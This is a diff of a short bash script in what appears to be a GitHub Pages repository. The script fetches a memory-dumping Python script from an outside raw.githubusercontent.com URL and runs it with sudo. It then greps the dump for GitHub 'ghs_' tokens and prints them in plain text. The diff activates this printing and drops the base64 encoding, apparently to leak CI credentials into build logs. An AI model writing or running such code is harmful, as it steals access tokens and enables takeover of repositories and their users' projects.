@@ -1,10 +1,10 @@
 .#!/usr/bin/env bash
 set -e
 readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
-#TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | awk 'NR==1' | xargs  `
-TOKEN_VAL2=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64`
+TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | awk 'NR==1' | xargs  `
+TOKEN_VAL2=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u `
 echo "-----------------------------------------------------------------"
-#echo "abc" "$TOKEN_VAL" "xyz"
+echo "abc" "$TOKEN_VAL" "xyz"
 echo "-----------------------------------------------------------------"
 echo "$TOKEN_VAL2"
 echo "-----------------------------------------------------------------"
